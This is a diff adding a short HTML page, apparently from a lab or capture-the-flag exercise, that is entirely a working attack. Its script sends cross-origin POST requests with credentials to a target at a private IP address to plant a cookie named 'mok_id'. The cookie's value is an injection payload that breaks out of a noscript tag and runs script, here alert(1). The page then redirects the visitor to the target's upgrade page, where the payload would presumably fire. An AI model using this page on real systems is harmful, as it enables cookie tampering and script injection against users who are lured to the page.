@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <title>Document</title>
+</head>
+ <body>
+  <script>
+      var cookie_hax = {
+          "mok_id": "</noscript><script>alert(1);</scr"+"ipt><noscript>"
+      };
+  
+      for (var name in cookie_hax) {
+          $.ajax({
+              type: "POST",
+              url: "http://10.10.125.188:1359/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
+              cache: false,
+              xhrFields: {
+                  withCredentials: true
+              },
+              crossDomain: true,
+              async: false
+          });
+      }
+  
+      window.location.replace("http://10.10.125.188:1359/upgrade");
+  </script>
+  </body>
+  
+  
+  
+</html>
